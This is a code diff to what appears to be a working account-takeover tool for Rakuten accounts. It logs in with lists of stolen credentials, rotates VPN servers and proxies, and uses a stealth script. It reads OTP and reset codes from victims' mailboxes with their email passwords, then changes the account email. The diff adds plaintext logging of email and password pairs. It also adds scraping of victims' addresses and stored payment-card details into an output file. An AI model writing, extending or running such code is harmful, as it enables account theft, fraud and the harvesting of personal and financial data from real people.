@@ -12,6 +12,9 @@ const Imap = require("imap");
 const POP3Client = require("poplib");
 const dns = require("dns").promises;
 const { simpleParser } = require("mailparser");
+const Database = require('better-sqlite3');
+const dbPath = path.resolve(__dirname, 'db.db');
+const db = new Database(dbPath, { readonly: true });
 
 // Helper function to make HTTPS requests
 function httpsRequest(url, options = {}) {
@@ -228,7 +231,7 @@ function execSafe(cmd) {
 async function connectExpress(server) {
   try {
     execSafe(`"${EXPRESSVPN_CLI}" disconnect`);
-  } catch (e) {}
+  } catch (e) { }
   console.log("Đang kết nối ExpressVPN ->", server);
   execSafe(`"${EXPRESSVPN_CLI}" connect "${server}"`);
   console.log(
@@ -365,12 +368,165 @@ async function waitForLoginResult(page, timeoutMs) {
 let imapMappings = {
   "mineo.jp": { server: "imaps.mineo.jp", port: 993 },
   "gmail.com": { server: "imap.gmail.com", port: 993 },
+  "google.com": { server: "imap.gmail.com", port: 993 },
+  "googlemail.com": { server: "imap.gmail.com", port: 993 },
   "yahoo.com": { server: "imap.mail.yahoo.com", port: 993 },
+  "yahoodns.com": { server: "imap.mail.yahoo.com", port: 993 },
+  "yahoodns.net": { server: "imap.mail.yahoo.com", port: 993 },
   "outlook.com": { server: "outlook.office365.com", port: 993 },
   "hotmail.com": { server: "outlook.office365.com", port: 993 },
+  "office365.com": { server: "outlook.office365.com", port: 993 },
+  "office365.cn": { server: "outlook.office365.com", port: 993 },
+  "office365.us": { server: "outlook.office365.com", port: 993 },
+  "outlook.de": { server: "outlook.office365.com", port: 993 },
   "aol.com": { server: "imap.aol.com", port: 993 },
+  "aol-yahoodns.com": { server: "imap.aol.com", port: 993 },
+  "aol-yahoodns.net": { server: "imap.aol.com", port: 993 },
+  "aol-yahoo.com": { server: "imap.aol.com", port: 993 },
   "icloud.com": { server: "imap.mail.me.com", port: 993 },
   "rakuten.jp": { server: "popmail.gol.com", port: 993 },
+  "gol.com": { server: "imap.gol.com", port: 993 },
+  "prodigy.net": { server: "imap.mail.att.net", port: 993 },
+  "att.net": { server: "imap.mail.att.net", port: 993 },
+  "gmx.net": { server: "imap.gmx.com", port: 993 },
+  "gmx.com": { server: "imap.gmx.com", port: 993 },
+  "schlund.de": { server: "imap.1und1.de", port: 993 },
+  "kundenserver.de": { server: "imap.1und1.de", port: 993 },
+  "1and1.co.uk": { server: "imap.1and1.co.uk", port: 993 },
+  "1and1.fr": { server: "imap.1and1.fr", port: 993 },
+  "1and1.es": { server: "imap.1and1.es", port: 993 },
+  "1and1.it": { server: "imap.1and1.it", port: 993 },
+  "1and1.com": { server: "imap.1and1.com", port: 993 },
+  "1and1.mx": { server: "imap.1and1.mx", port: 993 },
+  "1and1.at": { server: "imap.1and1.at", port: 993 },
+  "1and1.ca": { server: "imap.1and1.ca", port: 993 },
+  "1and1.ro": { server: "imap.1and1.ro", port: 993 },
+  "ionos.mx": { server: "imap.ionos.mx", port: 993 },
+  "ionos.es": { server: "imap.ionos.es", port: 993 },
+  "ionos.de": { server: "imap.ionos.de", port: 993 },
+  "ionos.com": { server: "imap.ionos.com", port: 993 },
+  "yandex.net": { server: "imap.yandex.com", port: 993 },
+  "yandex.com": { server: "imap.yandex.com", port: 993 },
+  "yandex.ru": { server: "imap.yandex.com", port: 993 },
+  "123-reg.co.uk": { server: "imaps.123-reg.co.uk", port: 993 },
+  "aruba.it": { server: "imaps.aruba.it", port: 993 },
+  "ebox.at": { server: "mail.ebox.at", port: 993 },
+  "digitalnova.at": { server: "imap.digitalnova.at", port: 993 },
+  "integrity.hu": { server: "imap.integrity.hu", port: 993 },
+  "t-online.hu": { server: "mail.t-online.hu", port: 993 },
+  "online.be": { server: "mail.online.be", port: 993 },
+  "domeneshop.no": { server: "imap.domeneshop.no", port: 993 },
+  "uio.no": { server: "imap.uio.no", port: 993 },
+  "263.net": { server: "imapw.263.net", port: 993 },
+  "qq.com": { server: "imap.qq.com", port: 993 },
+  "mxhichina.com": { server: "imap.mxhichina.com", port: 993 },
+  "163vip.net": { server: "imap.163vip.net", port: 993 },
+  "163.com": { server: "imap.163.com", port: 993 },
+  "nicmail.ru": { server: "mail.nicmail.ru", port: 993 },
+  "mail.dk": { server: "imap.mail.dk", port: 993 },
+  "lolipop.jp": { server: "pop3.lolipop.jp", port: 995 },
+  "nifty.jp": { server: "imap.nifty.com", port: 993 },
+  "ocn.ad.jp": { server: "pop.ocn.ne.jp", port: 995 },
+  "goo.ne.jp": { server: "imap.mail.goo.jp", port: 993 },
+  "hi-ho.ne.jp": { server: "imap.hi-ho.ne.jp", port: 993 },
+  "biglobe.ne.jp": { server: "mail.biglobe.ne.jp", port: 993 },
+  "eonet.ne.jp": { server: "imaps.eonet.ne.jp", port: 993 },
+  "securemx.jp": { server: "mail.securemx.jp", port: 993 },
+  "goope.jp": { server: "pop.goope.jp", port: 995 },
+  "emirates.net.ae": { server: "exmail.emirates.net.ae", port: 993 },
+  "freenet.de": { server: "mx.freenet.de", port: 993 },
+  "ispgateway.de": { server: "sslmailpool.ispgateway.de", port: 993 },
+  "rzone.de": { server: "imap.strato.de", port: 993 },
+  "belwue.de": { server: "mbox1.belwue.de", port: 993 },
+  "udag.de": { server: "imap.udag.de", port: 993 },
+  "t-online.de": { server: "secureimap.t-online.de", port: 993 },
+  "web.de": { server: "imap.web.de", port: 993 },
+  "datayard.us": { server: "imap.donet.com", port: 993 },
+  "ulaval.ca": { server: "courriel.ulaval.ca", port: 993 },
+  "kolumbus.fi": { server: "mail.kolumbus.fi", port: 993 },
+  "tlen.pl": { server: "poczta.o2.pl", port: 993 },
+  "go2.pl": { server: "poczta.o2.pl", port: 993 },
+  "onet.pl": { server: "pop3.poczta.onet.pl", port: 995 },
+  "iq.pl": { server: "mail.iq.pl", port: 993 },
+  "interia.pl": { server: "poczta.interia.pl", port: 993 },
+  "wp.pl": { server: "imap.wp.pl", port: 993 },
+  "superhost.pl": { server: "mail.superhost.pl", port: 993 },
+  "freehost.com.ua": { server: "freemail.freehost.com.ua", port: 993 },
+  "serviciodecorreo.es": { server: "imap.serviciodecorreo.es", port: 993 },
+  "tele2.se": { server: "imap.tele2.se", port: 993 },
+  "ziggo.nl": { server: "imap.ziggo.nl", port: 993 },
+  "as9143.net": { server: "imap.ziggo.nl", port: 993 },
+  "infomaniak.ch": { server: "mail.infomaniak.ch", port: 993 },
+  "netzone.ch": { server: "mail.netzone.ch", port: 993 },
+  "sunrise.ch": { server: "imap.sunrise.ch", port: 993 },
+  "mailanyone.net": { server: "imap.mailanyone.net", port: 993 },
+  "one.com": { server: "imap.one.com", port: 993 },
+  "coxmail.com": { server: "imap.coxmail.com", port: 993 },
+  "amazon.com": { server: "imap.mail.us-west-2.awsapps.com", port: 993 },
+  "staysecuregroup.com": { server: "imap.pop.groth-eu.mx1.staysecuregroup.com", port: 993 },
+  "avasin.plus.net": { server: "imap.plus.net", port: 993 },
+  "messagingengine.com": { server: "mail.messagingengine.com", port: 993 },
+  "gandi.net": { server: "mail.gandi.net", port: 993 },
+  "ovh.net": { server: "ssl0.ovh.net", port: 993 },
+  "freeola.com": { server: "mail.freeola.com", port: 993 },
+  "freeola.net": { server: "mail.freeola.com", port: 993 },
+  "secureserver.net": { server: "imap.secureserver.net", port: 993 },
+  "secureserver.com": { server: "imap.secureserver.net", port: 993 },
+  "dreamhost.com": { server: "imap.dreamhost.com", port: 993 },
+  "windstream.net": { server: "imap.windstream.net", port: 993 },
+  "carrierzone.com": { server: "securemail25.carrierzone.com", port: 993 },
+  "earthlink.net": { server: "imap.earthlink.net", port: 993 },
+  "oxsus-vadesecure.net": { server: "imap.earthlink.net", port: 993 },
+  "migadu.com": { server: "imap.migadu.com", port: 993 },
+  "lcn.com": { server: "imap.lcn.com", port: 993 },
+  "zoho.com": { server: "imap.zoho.com", port: 993 },
+  "zohomail.com": { server: "imap.zoho.com", port: 993 },
+  "zoho.eu": { server: "imap.zoho.com", port: 993 },
+  "zohomail.eu": { server: "imap.zoho.com", port: 993 },
+  "jimdo.com": { server: "secure.emailsrvr.com", port: 993 },
+  "emailsrvr.com": { server: "secure.emailsrvr.com", port: 993 },
+  "gosecure.net": { server: "mail.gosecure.net", port: 993 },
+  "worksmobile.com": { server: "imap.worksmobile.com", port: 993 },
+  "reflexion.net": { server: "imap.reflexion.net", port: 993 },
+  "easyname.eu": { server: "imap.easyname.eu", port: 993 },
+  "transip.email": { server: "imap.transip.email", port: 993 },
+  "online.net": { server: "imap.online.net", port: 993 },
+  "integra.net": { server: "imap.integra.net", port: 993 },
+  "atlantic.net": { server: "mail.atlantic.net", port: 993 },
+  "rr.com": { server: "mail.twc.com", port: 993 },
+  "messageexchange.com": { server: "mail.messageexchange.com", port: 993 },
+  "draude.net": { server: "mail.draude.net", port: 993 },
+  "abchk.net": { server: "imap.abchk.net", port: 993 },
+  "level27.eu": { server: "mail.level27.eu", port: 993 },
+  "level27.be": { server: "mail.level27.eu", port: 993 },
+  "simply.com": { server: "imap.simply.com", port: 993 },
+  "netvigator.com": { server: "imap.netvigator.com", port: 993 },
+  "privateemail.com": { server: "mail.privateemail.com", port: 993 },
+  "everyone.net": { server: "imap.everyone.net", port: 993 },
+  "domain.com": { server: "imap.domain.com", port: 993 },
+  "wanadoo.com": { server: "imap.orange.fr", port: 993 },
+  "daum.net": { server: "imap.daum.net", port: 993 },
+  "rr.net": { server: "mail.twc.com", port: 993 },
+  "writing.com": { server: "mail.writing.com", port: 993 },
+  "hostedemail.com": { server: "imap.hostedemail.com", port: 993 },
+  "endrop.com": { server: "mail.endrop.com", port: 993 },
+  "hostinger.com": { server: "imap.hostinger.com", port: 993 },
+  "hostinger.co": { server: "imap.hostinger.com", port: 993 },
+  "hostinger.es": { server: "imap.hostinger.com", port: 993 },
+  "hostinger.co.uk": { server: "imap.hostinger.com", port: 993 },
+  "centurylink.net": { server: "mail.centurylink.net", port: 993 },
+  "megamailservers.com": { server: "securemail.megamailservers.com", port: 993 },
+  "megamailservers.eu": { server: "securemail.megamailservers.com", port: 993 },
+  "mail.com": { server: "imap.mail.com", port: 993 },
+  "mimecast.com": { server: "eu-pop.mimecast.com", port: 995 },
+  "muumuu-mail.com": { server: "pop3.muumuu-mail.com", port: 995 },
+  "mimecast.co.za": { server: "za-pop.mimecast.co.za", port: 995 },
+  "nifcloud.com": { server: "pop.bizmail.nifcloud.com", port: 995 },
+  "kcn.ne.jp": { server: "pop1.kcn.jp", port: 993 },
+  "dokidoki.ne.jp": { server: "mail.dokidoki.ne.jp", port: 993 },
+  "ad-k.jp": { server: "mail.ad-k.jp", port: 993 },
+  "m3.kcn.ne.jp": { server: "pop1.kcn.jp", port: 993 },
+  "kcn.jp": { server: "pop1.kcn.jp", port: 993 },
 };
 
 let domainsLoaded = false;
@@ -444,17 +600,43 @@ async function discoverMailSettings(domain) {
       await dns.lookup(host);
       console.log(`✨ Tìm thấy server qua DNS: ${host}`);
       return { server: host, port: p.startsWith("pop") ? 110 : 993 };
-    } catch (e) {}
+    } catch (e) { }
   }
 
   return null;
 }
 
+/**
+ * Hàm lấy cấu hình IMAP theo Domain từ SQLite
+ */
+function getImapConfig(domain) {
+  try {
+    const query = db.prepare('SELECT * FROM IMAP WHERE Domain = ?');
+    const row = query.get(domain);
+    if (!row) return null;
+
+    return {
+      server: row.Server,
+      port: row.Port,
+      isSsl: (row.SocketType === 0 || row[3] === 0),
+      type: row.Type?.toLowerCase() || 'imap'
+    };
+  } catch (e) {
+    return null;
+  }
+}
+
 async function getImapServer(domain) {
-  loadDomains();
   const d = domain.toLowerCase();
 
-  // 1. Kiểm tra mapping hiện có (từ file hoặc hardcode)
+  // 1. Kiểm tra trong Database trước
+  const dbConfig = getImapConfig(d);
+  if (dbConfig) {
+    return dbConfig;
+  }
+
+  // 2. Kiểm tra mapping hiện có (từ domains.txt hoặc hardcode)
+  loadDomains();
   const parts = d.split(".");
   for (let i = 0; i <= parts.length - 2; i++) {
     const parentDomain = parts.slice(i).join(".");
@@ -463,14 +645,14 @@ async function getImapServer(domain) {
     }
   }
 
-  // 2. Nếu không thấy, thử Auto-discovery
+  // 3. Nếu không thấy, thử Auto-discovery
   const discovered = await discoverMailSettings(d);
   if (discovered) {
-    imapMappings[d] = discovered; // Cache lại trong memory
+    imapMappings[d] = discovered;
     return discovered;
   }
 
-  // 3. Fallback mặc định
+  // 4. Fallback mặc định
   return { server: `imap.${domain}`, port: 993 };
 }
 
@@ -570,7 +752,7 @@ async function readCodeFromEmailPop3(
       if (isAuthError || isConfigError) {
         fs.appendFileSync(
           path.resolve(__dirname, "email_error.txt"),
-          `${email}|${type}|CRITICAL_ERROR_POP3: ${lastError}|${new Date().toLocaleString()}\n`,
+          `${email}|${password}|CRITICAL_ERROR_POP3: ${lastError}|${new Date().toLocaleString()}\n`,
           "utf8",
         );
         throw new Error(
@@ -582,7 +764,7 @@ async function readCodeFromEmailPop3(
   }
   fs.appendFileSync(
     path.resolve(__dirname, "email_error.txt"),
-    `${email}|${type}|ERROR_POP3: ${lastError}|${new Date().toLocaleString()}\n`,
+    `${email}|${password}|ERROR_POP3: ${lastError}|${new Date().toLocaleString()}\n`,
     "utf8",
   );
   return null;
@@ -590,9 +772,11 @@ async function readCodeFromEmailPop3(
 
 async function readCodeFromEmail(email, password, type = "password_reset") {
   const domain = email.split("@")[1];
-  const { server, port } = await getImapServer(domain);
+  const config = await getImapServer(domain);
+  const { server, port } = config;
+  const isSsl = config.isSsl || port == 993 || port == 995 || port == 465;
+  const isPop3 = config.type === 'pop3' || port == 110 || port == 995;
 
-  const isPop3 = port == 110 || port == 995;
   if (isPop3) {
     return readCodeFromEmailPop3(email, password, server, port, type);
   }
@@ -602,14 +786,14 @@ async function readCodeFromEmail(email, password, type = "password_reset") {
     password: password,
     host: server,
     port: port,
-    tls: true,
+    tls: isSsl,
     tlsOptions: {
       rejectUnauthorized: false,
       minVersion: "TLSv1",
       ciphers: "DEFAULT@SECLEVEL=0",
     },
-    connTimeout: 10000,
-    authTimeout: 10000,
+    connTimeout: 20000,
+    authTimeout: 20000,
   };
 
   const timeout = 30000;
@@ -730,7 +914,7 @@ async function readCodeFromEmail(email, password, type = "password_reset") {
       if (isAuthError || isConfigError) {
         fs.appendFileSync(
           path.resolve(__dirname, "email_error.txt"),
-          `${email}|${type}|CRITICAL_ERROR_EMAIL: ${lastError}|${new Date().toLocaleString()}\n`,
+          `${email}|${password}|CRITICAL_ERROR_EMAIL: ${lastError}|${new Date().toLocaleString()}\n`,
           "utf8",
         );
         throw new Error(
@@ -742,7 +926,7 @@ async function readCodeFromEmail(email, password, type = "password_reset") {
   }
   fs.appendFileSync(
     path.resolve(__dirname, "email_error.txt"),
-    `${email}|${type}|ERROR_EMAIL: ${lastError}|${new Date().toLocaleString()}\n`,
+    `${email}|${password}|ERROR_EMAIL: ${lastError}|${new Date().toLocaleString()}\n`,
     "utf8",
   );
   return null;
@@ -1076,7 +1260,7 @@ async function changeEmail(page, email, password, hotmailString, tag) {
       timeout: 60000,
     });
     await checkSkip(page);
-    await sleep(30000000);
+    await sleep(3000);
 
     // If redirected to login, retry
     if (page.url().includes("login.account.rakuten.com")) {
@@ -1186,16 +1370,14 @@ async function changeEmail(page, email, password, hotmailString, tag) {
       await page.click("#submit");
       console.log(`${tag} → Đã submit OTP để xác thực email`);
       await sleep(10000);
-      console.log(`${tag} → ✅ Đổi email thành công thành: ${newEmail}`);
-      return { success: true, message: newEmail };
       // "#editEmail > div > p" contains changed email
-      // const changedEmail = await page.$eval('#editEmail > div > p', el => el.textContent.trim());
-      // if (changedEmail && changedEmail.includes(newEmail)) {
-      //   console.log(`${tag} → ✅ Đổi email thành công thành: ${newEmail}`);
-      //   return { success: true, message: newEmail };
-      // } else {
-      //   return { success: false, message: 'Đổi email không thành công' };
-      // }
+      const changedEmail = await page.$eval('#editEmail > div > p', el => el.textContent.trim());
+      if (changedEmail && changedEmail.includes(newEmail)) {
+        console.log(`${tag} → ✅ Đổi email thành công thành: ${newEmail}`);
+        return { success: true, message: newEmail };
+      } else {
+        return { success: false, message: 'Đổi email không thành công' };
+      }
     } catch (e) {
       console.error(`${tag} → Lỗi khi nhập/submit OTP`);
       return { success: false, message: "Error entering/submitting OTP" };
@@ -1209,6 +1391,7 @@ async function changeEmail(page, email, password, hotmailString, tag) {
 // Check points similar to _check_points in main.py
 async function checkPoints(page, tag) {
   const pointsDetails = [];
+  const extraDetails = [];
 
   try {
     // Navigate to points page
@@ -1286,7 +1469,7 @@ async function checkPoints(page, tag) {
       // Not found, skip
     }
 
-    // 4. Navigate to my.rakuten.co.jp for Cash Points
+    // 4. Navigate to my.rakuten.co.jp for Cash Points & Rank
     try {
       await page.goto("https://my.rakuten.co.jp/?l-id=pc_footer_account", {
         waitUntil: "networkidle",
@@ -1294,27 +1477,111 @@ async function checkPoints(page, tag) {
       });
       await sleep(3000);
 
-      await page.waitForSelector('[data-ratid="available-rcash-area"]', {
-        timeout: 5000,
-      });
-      const el = await page.$(
-        '[data-ratid="available-rcash-area"] span:nth-child(2)',
-      );
-      if (el) {
-        const text = await el.textContent();
-        const cleaned = text.trim().replace(/[^\d]/g, "");
-        if (cleaned) {
-          const value = parseInt(cleaned, 10);
-          pointsDetails.push(`Cash: ${value.toLocaleString()}`);
+      // Cash Points
+      try {
+        const el = await page.$(
+          '[data-ratid="available-rcash-area"] span:nth-child(2)',
+        );
+        if (el) {
+          const text = await el.textContent();
+          const cleaned = text.trim().replace(/[^\d]/g, "");
+          if (cleaned) {
+            const value = parseInt(cleaned, 10);
+            pointsDetails.push(`Cash: ${value.toLocaleString()}`);
+          }
         }
-      }
+      } catch (e) { }
+
+      // Rank
+      try {
+        const rankEl = await page.$(".PointGadget_user_rank__CqOqY");
+        if (rankEl) {
+          let rankText = await rankEl.textContent();
+          // rankText = rankText.replace("あなたは", "").replace("です", "").trim();
+          extraDetails.push(`Rank(${rankText})`);
+        }
+      } catch (e) { }
     } catch (e) {
       // Not found, skip
     }
 
+    // 5. Address: https://profile.id.rakuten.co.jp/addresses/jp
+    try {
+      await page.goto("https://profile.id.rakuten.co.jp/addresses/jp", {
+        waitUntil: "networkidle",
+        timeout: 30000,
+      });
+      await sleep(2000);
+      const addrEl = await page.$('[data-qa-id="address-summary"]');
+      if (addrEl) {
+        const text = await addrEl.innerText();
+        const cleaned = text
+          .split("\n")
+          .map((s) => s.trim())
+          .filter(Boolean)
+          .join(" ");
+        extraDetails.push(`Address(${cleaned})`);
+      }
+    } catch (e) { }
+
+    // 6. List card: https://profile.id.rakuten.co.jp/payments
+    try {
+      await page.goto("https://profile.id.rakuten.co.jp/payments", {
+        waitUntil: "domcontentloaded",
+        timeout: 30000,
+      });
+      await sleep(8000);
+      await page.waitForSelector('[data-qa-id^="card-"]', {
+        timeout: 15000,
+      });
+
+      const cards = await page.locator('[data-qa-id^="card-"]').evaluateAll(
+        (els) => {
+          return els
+            .map((card) => {
+              const getText = (selector) => {
+                const el = card.querySelector(selector);
+                return el?.textContent?.trim() || "";
+              };
+
+              const num = getText('[data-qa-id="card-number"]')
+                .replace("下4桁", "")
+                .trim();
+
+              const name = getText('[data-qa-id="card-holder-name"]');
+
+              const exp = getText('[data-qa-id="card-expiry-date"]');
+
+              if (!num && !name && !exp) return null;
+
+              return {
+                number: num,
+                name,
+                exp,
+                raw: `${num} ${name} ${exp}`.replace(/\s+/g, " ").trim(),
+              };
+            })
+            .filter(Boolean);
+        },
+      );
+
+      if (cards.length > 0) {
+        extraDetails.push(`Cards(${cards.map((c) => c.raw).join(", ")})`);
+      }
+    } catch (e) {
+      console.log("Không thể lấy danh sách thẻ", e.message);
+    }
+
+    // Combine
+    let summary = pointsDetails.join(" | ");
+    if (extraDetails.length > 0) {
+      if (summary) summary += " | ";
+      summary += extraDetails.join("-");
+    }
+
     // Return result
-    if (pointsDetails.length > 0) {
-      return { success: true, summary: pointsDetails.join(" | ") };
+    if (summary) {
+      return { success: true, summary };
     } else {
       return { success: false, summary: "" };
     }
@@ -1323,6 +1590,7 @@ async function checkPoints(page, tag) {
     return { success: false, summary: "" };
   }
 }
+
 
 // global processed count for ExpressVPN rotate
 let globalProcessed = 0;
@@ -1354,12 +1622,12 @@ function makeContextOptions(proxyObj) {
     timezoneId: "America/New_York",
     ...(proxyObj
       ? {
-          proxy: {
-            server: proxyObj.server,
-            username: proxyObj.username,
-            password: proxyObj.password,
-          },
-        }
+        proxy: {
+          server: proxyObj.server,
+          username: proxyObj.username,
+          password: proxyObj.password,
+        },
+      }
       : {}),
   };
 }
@@ -1433,6 +1701,7 @@ async function processAccountAtSlot(
   }
 
   let browser;
+  let context;
   try {
     browser = await chromium.launch(launchOptions);
   } catch (e) {
@@ -1451,7 +1720,7 @@ async function processAccountAtSlot(
   try {
     // create context with possibly different proxy (context-level) if desired; here reuse launchProxy for simplicity
     const contextOptions = makeContextOptions(launchProxy);
-    const context = await browser.newContext(contextOptions);
+    context = await browser.newContext(contextOptions);
     await context.addInitScript(stealthInitScript());
     const page = await context.newPage();
     page.setDefaultTimeout(TIMEOUT_MS);
@@ -1518,12 +1787,6 @@ async function processAccountAtSlot(
           "utf8",
         );
         removeAccountFromFile(acc.email);
-        try {
-          await context.close();
-        } catch (e) {}
-        try {
-          await browser.close();
-        } catch (e) {}
         return;
       }
     }
@@ -1533,7 +1796,7 @@ async function processAccountAtSlot(
         `✅ ${tag} → Đã đăng nhập — đang kiểm tra điểm (Check-point)`,
       );
       const pointsData = await checkPoints(page, tag);
-
+      // console.log("pointsData", pointsData);
       let changedEmailResult = null;
       if (hotmail) {
         console.log(`🔄 ${tag} → Đang thử đổi email...`);
@@ -1560,7 +1823,7 @@ async function processAccountAtSlot(
       if (pointsData.success) {
         const pointLine = changedEmailResult
           ? `${acc.email}|${oldPassword}|${acc.changePassword}|${pointsData.summary}|${changedEmailResult}\n`
-          : `${acc.email}|${oldPassword}|${acc.changePassword}|${pointsData.summary}\n`;
+          : `${acc.email}|${oldPassword}|${acc.changePassword}|${pointsData.summary}|Không đổi được email\n`;
         fs.appendFileSync(
           path.resolve(__dirname, "point_account.txt"),
           pointLine,
@@ -1579,19 +1842,14 @@ async function processAccountAtSlot(
 
       removeAccountFromFile(acc.email);
     }
-
-    try {
-      await context.close();
-    } catch (e) {}
-    try {
-      await browser.close();
-    } catch (e) {}
     return;
   } catch (e) {
     console.error(`${tag} → Lỗi không mong đợi:`, e.message);
+  } finally {
     try {
+      await context.close();
       if (browser) await browser.close();
-    } catch (err) {}
+    } catch (err) { }
   }
 }
 
